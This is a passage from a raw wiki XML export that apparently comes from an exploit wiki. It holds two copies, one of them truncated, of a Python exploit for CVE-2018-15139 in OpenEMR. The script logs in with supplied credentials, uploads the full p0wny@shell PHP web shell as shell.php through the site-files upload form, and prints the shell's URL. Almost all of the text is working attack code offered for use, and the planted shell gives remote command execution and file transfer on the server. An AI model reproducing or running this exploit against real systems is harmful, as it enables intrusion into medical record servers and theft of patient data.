my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
openemr_path = args.PATH
username = args.USERNAME
password = args.PASSWORD

'''
Authentication:
'''
# Preparation:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/main/main_screen.php?auth=login&amp;site=default'
auth_chek_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/login/login.php?site=default'
response = session.get(auth_chek_url)

# Header (auth):
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Referer': auth_chek_url,
    'Upgrade-Insecure-Requests': '1',
}

# Body (auth):
body = {
    'new_login_session_management': '1',
    'authProvider': 'Default',
    'authUser': username,
    'clearPass': password,
    'languageChoice': '1'
}

# Authentication:
print('')
print('[+] Authentication')
auth = session.post(auth_url,headers=header, data=body)


'''
Exploit:
'''
print('')
print('[+] Uploading Webshell:')

# URL:
exploit_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/super/manage_site_files.php'

# Headers (Exploit):
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------31900464228840324774249185339",
    "Origin": "http://" + target_ip,
    "Connection": "close",
    "Referer": 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/super/manage_site_files.php',
    "Upgrade-Insecure-Requests": "1"
}

# Body (Exploit):
body = "-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_filename\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_filedata\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n12000000\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_image\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_dest_filename\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_education\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"bn_save\"\r\n\r\nSave\r\n-----------------------------31900464228840324774249185339--\r\n"

# Send Exploit:
session.post(exploit_url, headers=header, data=body)

# Finish
path = 'http://' + target_ip + ':' + target_port + openemr_path + '/sites/default/images/shell.php'
print('[+] Webshell: ' + path)
&lt;/pre&gt;</text>
      <sha1>rxrikku1kbgu0mkw8jbh2tj9296kgra</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-15139 OpenEMR 5.0.1.3 遠程代碼執行漏洞/es</title>
    <ns>0</ns>
    <id>4576</id>
    <revision>
      <id>5264</id>
      <timestamp>2021-06-17T01:15:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versión afectada =="</comment>
      <origin>5264</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="23265" sha1="pi2d44mkadkvek0coft1i1pp74841d5" xml:space="preserve">&lt;languages /&gt;

== Versión afectada ==
&lt;pre&gt;
Version: Prior to 5.0.1.4
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)
# Date 12.06.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v5_0_1_3.zip
# Version: Prior to 5.0.1.4
# Tested on: Ubuntu 18.04
# CVE: CVE-2018-15139
# CWE: CWE-434
# Documentation: https://github.com/Hacker5preme/Exploits#CVE-2018-15139

'''
Description:
Unrestricted file upload in interface/super/manage_site_files.php in versions of OpenEMR before 5.0.1.4 allows a remote
authenticated attacker to execute arbitrary PHP code by uploading a file with a PHP extension via the images upload
form and accessing it in the images directory.
'''


'''
Banner:
'''
banner ="""
 ___                   _____ __  __ ____            ____   ___   _   _____  
  / _ \ _ __   ___ _ __ | ____|  \/  |  _ \          | ___| / _ \ / | |___ /  
 | | | | '_ \ / _ \ '_ \|  _| | |\/| | |_) |  _____  |___ \| | | || |   |_ \  
 | |_| | |_) |  __/ | | | |___| |  | |  _ &lt;  |_____|  ___) | |_| || |_ ___) | 
  \___/| .__/ \___|_| |_|_____|_|  |_|_| \_\         |____(_)___(_)_(_)____/  
       |_|                                                                    

                    _____            _       _ _   
                    | ____|_  ___ __ | | ___ (_) |_ 
                    |  _| \ \/ / '_ \| |/ _ \| | __|
                    | |___ &gt;  &lt;| |_) | | (_) | | |_ 
                    |_____/_/\_\ .__/|_|\___/|_|\__|
                               |_|                  

"""
print(banner)


'''
Import required modules
'''
import argparse
import requests


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='OpenEMR Remote Code Execution')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
openemr_path = args.PATH
username = args.USERNAME
password = args.PASSWORD

'''
Authentication:
'''
# Preparation:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/main/main_screen.php?auth=login&amp;site=default'
auth_chek_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/login/login.php?site=default'
response = session.get(auth_chek_url)

# Header (auth):
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Referer': auth_chek_url,
    'Upgrade-Insecure-Requests': '1',
}

# Body (auth):
body = {
    'new_login_session_management': '1',
    'authProvider': 'Default',
    'authUser': username,
    'clearPass': password,
    'languageChoice': '1'
}

# Authentication:
print('')
print('[+] Authentication')
auth = session.post(auth_url,headers=header, data=body)


'''
Exploit:
'''
print('')
print('[+] Uploading Webshell:')

# URL:
exploit_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/super/manage_site_files.php'

# Headers (Exploit):
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------31900464228840324774249185339",
    "Origin": "http://" + target_ip,
    "Connection": "close",
    "Referer": 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/super/manage_site_files.php',
    "Upgrade-Insecure-Requests": "1"
}

# Body (Exploit):
body = "-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_filename\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_filedata\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n12000000\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_image\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    